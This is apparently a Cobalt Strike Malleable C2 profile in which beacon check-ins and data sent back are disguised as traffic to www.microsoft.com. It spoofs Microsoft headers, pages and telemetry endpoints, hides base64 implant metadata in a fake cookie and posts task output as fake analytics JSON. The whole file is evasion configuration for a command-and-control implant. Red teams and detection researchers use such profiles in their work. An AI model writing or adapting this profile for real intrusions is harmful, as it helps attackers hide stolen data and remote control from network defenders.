set sleeptime "15000";
set jitter "20";
set maxdns "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";

http-get {
  set uri "/en-us/silentauth";

  client {
    header "Host" "www.microsoft.com";
    header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    header "Referer" "https://www.microsoft.com/en-us/search/result.aspx?form=MSHOME";

    metadata {
      base64;
      prepend "MSCOMBIID=";
      append ";";
      header "Cookie";
    }
  }

  server {
    header "Cache-Control" "no-cache, no-store";
    header "Pragma" "no-cache";
    header "Content-Type" "text/html";
    header "Expires" "-1";
    header "Server" "Microsoft-IIS/8.5";
    header "P3P" "CP=\"ALL IND DSP COR ADM CONo CUR CUSo IVAo IVDo PSA PSD TAI TELo OUR SAMo CNT COM INT NAV ONL PHY PRE PUR UNI\"";
    header "CorrelationVector" "fFtyPuF1nE+KybfD.9.0";
    header "X-AspNet-Version" "4.0.30319";
    header "X-Powered-By" "ASP.NET";
    header "Access-Control-Allow-Headers" "Origin, X-Requested-With, Content-Type, Accept";
    header "Access-Control-Allow-Methods" "GET, POST, PUT, DELETE, OPTIONS";
    header "Access-Control-Allow-Credentials" "true";
    header "X-Frame-Options" "SAMEORIGIN";
    header "X-Powered-By" "ARR/2.5";
    header "X-Powered-By" "ASP.NET";
    header "Vary" "Accept-Encoding";
    header "Connection" "close";
    header "Strict-Transport-Security" "max-age=31536000";
    header "X-CCC" "US";
    header "X-CID" "2";

    output {
      base64;
      prepend "<!DOCTYPE html ><html lang=\"en-us\" xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /><meta charset=\"utf-8\" /><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /><script type=\"text/javascript\" src=\"https://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.11.1.min.js\"> // Third party scripts and code linked to or referenced from this website are licensed to you by the parties that own such code, not by Microsoft. See ASP.NET Ajax CDN Terms of Use - http://www.asp.net/ajaxlibrary/CDN.ashx.</script><link rel=\"shortcut icon\" href=\"//www.microsoft.com/favicon.ico?v2\" /><title>New Page</title><meta name=\"Title\" content=\"New Page\" /><meta name=\"CorrelationVector\" content=\"fFtyPuF1nE+KybfD.9\" /><meta name=\"Description\" content=\"\" /><meta name=\"MscomContentLocale\" content=\"en-us\" /></head><body><div class=\"CSPvNext\"><div class=\row-fluid\" data-view4=\"1\" data-view3=\"1\" data-view2=\"1\" data-view1=\"1\" data-cols=\"1\"><div class=\"span bp0-col-1-1 bp1-col-1-1 bp2-col-1-1 bp3-col-1-1\"><div class=\"row\"><div class=\"col-1-1\"><script>/*";
      append "<![CDATA[*/var aFirstName,aLastName,aMemberName,aCid,aAuthenticatedState=window.top.msCommonShell.AuthState.NotSignedIn,userData={idp:window.top.msCommonShell.SupportedAuthIdp.MSA,firstName:aFirstName,lastName:aLastName,memberName:aMemberName,cid:aCid,authenticatedState:aAuthenticatedState};aMemberName!==\"\"&&window.parent.MSA.MeControl.API.setActiveUser(userData)/*]]>*/</script></div></div></div></div></div></body></html>";
      print;
    }
  }
}

http-post {
  set uri "/collect/v1";

  client {
    header "Content-Type" "application/x-json-stream";
    header "Referer" "https://www.microsoft.com/en-us/";
    header "Origin" "https://www.microsoft.com";

    id {
      parameter "id";
    }

    output {
      base64;
      prepend "{\"ver\":\"2.1\",\"cV\":\"";
      append "\",\"appId\":\"JS:www.microsoft.com\"}";
      print;
    }
  }

  server {
    header "Cache-Control" "no-cache, no-store";
    header "Pragma" "no-cache";
    header "Content-Type" "application/json";
    header "Expires" "0";
    header "X-Content-Type-Options" "nosniff";
    header "X-XblCorrelationId" "2c9bf2cd-0aca-4bc9-8e9d-1db64975008d;";
    header "Access-Control-Allow-Headers" "Accept, Authorization, Content-Type, Origin, X-Xbl-Contract-Version, X-Xbl-Device-Type, Xbl-Authz-Actor-10";
    header "Access-Control-Allow-Origin" "https://www.microsoft.com";

    output {
      base64;
      prepend "{\"ipv\":false,\"pvm\":\"";
      append "\",\"rej\":0,\"bln\":0,\"acc\":1,\"efi\":[]}";
      print;
    }
  }
}